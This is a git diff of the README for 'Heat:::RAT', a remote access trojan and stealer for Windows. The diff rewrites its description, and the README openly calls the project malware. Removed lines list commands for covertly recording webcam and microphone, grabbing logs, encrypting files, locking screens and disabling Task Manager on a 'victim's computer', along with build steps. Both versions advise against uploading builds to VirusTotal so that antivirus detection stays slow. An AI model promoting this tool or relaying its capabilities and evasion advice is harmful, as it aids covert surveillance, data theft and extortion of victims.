@@ -1,20 +1,20 @@
 <a id ="up"></a>
-[![logo](files_for_GitHub/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
+[![logo](for_readme/LOGO.png)](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 <img src="https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white">
 <img src="https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white">
 <img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white">
 <img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
 <img src="https://img.shields.io/badge/build-passing-76B900?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/tests-99/100-76B900?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/tests-96/100-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/code quality-A-76B900?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
-<img src="https://img.shields.io/badge/Heat:::RAT-v3.0.3-blue?style=for-the-badge&logo=&logoColor=whit">
+<img src="https://img.shields.io/badge/Heat:::RAT-v4.0.0-blue?style=for-the-badge&logo=&logoColor=whit">
 <img src="https://img.shields.io/badge/Microsoft-666666?style=for-the-badge&logo=microsoft&logoColor=white">
 <img src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white">
 
 [RAT+STEALER](https://github.com/Nick-Vinesmoke/Heat-RAT/releases/tag/HeatRAT_v3.0.3)
 ---
-🔭Program for remote control of windows computers via cmd. Written in C++
+🔭Program for remote control of Windows computers. Huge functionality. It has full and lite versions.
 
 ⭐Please, star this repo if it was helpful⭐
 
@@ -29,131 +29,24 @@ I, the creator, am __NOT__ responsible for any actions, and or damages, caused b
 __Don't upload builded rat to Virustotal__. The more often you upload it, the more and faster antiviruses begin to recognize its signature.
 
 ---
- 
- 
- 
-### 📠Functions:
 
-> !screenshot"
-> - do a screenshot and sent to you
+### 📃About
 
-> "!photoWebcam"
->- do a photo from the webcam and sent to you
-
-> "!openLink"
->- open the link on the victim's computer
-
-> "!directory"
->- get a path to rat virus
-
-> "!directoryContent"
->- get all files name placed in the same directory with virus
-
-> "!createFolder"
->- create a folder on the victim's computer
-
-> "!deleteFolder"
->- delete a folder on the victim's computer
-
-> "!deleteFile"
->- delete a file on the victim's computer
-
-> downloadFile"
->- download the file to the victim's computer
-
-> "!video"
->- rec the video from the victim's webcam, duration in seconds
-
-> "!audio"
->- rec the audio from the victim's microphone, duration in seconds
-
-> "!runFile"
->- run the file on the victim's computer
-
-> "!volume"
->- change the volume on the victim's computer
-
-> "!turnOff"
->- shutdown the victim's computer
-
-> "!restart"
->- restart the victim's computer
-
-> "!alt+f4"
->- alt+f4 =)
-
-> "!crazyCursor"
->- change mouse buttons
-
-> "!wallpaper"
->- change the wallpaper on the victim's compute
-
-> "!move"
->- move the virus to the directory
-
-> "!rename"
->- rename the virus
-
-> "!encrypt"
->- encrypt file on the victim's computer
-
-> "!decrypt"
->- decrypt file on the victim's computer
-
-> "!logs"
->- grab and send logs from the victim's computer
-
-> "!screamer"
->- screamer :O
-
-> "!moveFile"
->- move the file to the directory on victim's computer
-
-> "!lock"
->- #winlock ('._.')
-
-> "!downloadFolder"
->- download folder to the victim's computer
-
-> "!processes"
->- show process list
-
-> "!closeProces"
->- close process
-
-> "!banTM"
->- ban task manager
-
-> "!message"
->- show text message
-
-> "!CMDbomb"
->- booom
+This malware has 2 versions of itself: full and lite.
+Read more about the [full version](https://github.com/Nick-Vinesmoke/Heat-RAT/tree/master/HeatRAT).
+Read more about the [lite version](https://github.com/Nick-Vinesmoke/Heat-RAT/tree/master/HeatRAT_lite).
 
 ---
- 
- 
- 
-### 🔨Building
 
-![image](files_for_GitHub/Screenshot_1.png)
+### 🖼Overview of full ver
 
-Than press Ctrl+Shift+B. You'll find builted control panel in the folder release. After that, place .exe file like in this photo.
+![image](for_readme/Screenshot_4.png)
 
-![image](files_for_GitHub/Screenshot_7.png)
+![image](for_readme/Screenshot_5.png)
 
----
- ### ⚙How to set up Heat:::RAT
- This is a fairly large topic, so in order not to stuff it into the readme, [I made a separate site for it.](https://sites.google.com/view/heat-rat)
- 
- ---
-### 🎴Overview
+![image](for_readme/Screenshot_6.png)
 
-![image](files_for_GitHub/Screenshot_4.png)
-
-![image](files_for_GitHub/Screenshot_5.png)
-
-![image](files_for_GitHub/Screenshot_6.png)
+![image](for_readme/Screenshot_7.png)
 
 ---
 
